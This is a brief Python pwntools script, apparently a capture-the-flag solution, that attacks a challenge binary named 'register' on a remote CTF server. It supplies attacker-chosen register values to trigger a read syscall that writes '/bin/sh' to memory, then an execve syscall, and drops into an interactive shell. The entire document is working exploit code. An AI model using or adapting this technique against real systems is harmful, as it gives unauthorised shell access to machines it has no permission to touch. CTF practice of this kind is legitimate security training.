from pwn import *

#p = process('./register')
p = remote('ctf.j0n9hyun.xyz', 3026)
e = ELF('./register')

context.log_level = "debug"

pause()
def fun(rax, rdi,rsi,rdx):
	register = list([rax, rdi,rsi,rdx,0,0,0])
	print register
	for reg in register:
		p.recv()
	        p.sendline(str(reg))

data = 0x601068

fun(0, 0, data, 10)

p.sendline('/bin/sh\x00')

fun(59, data, 0, 0)

sleep(5)
p.interactive()
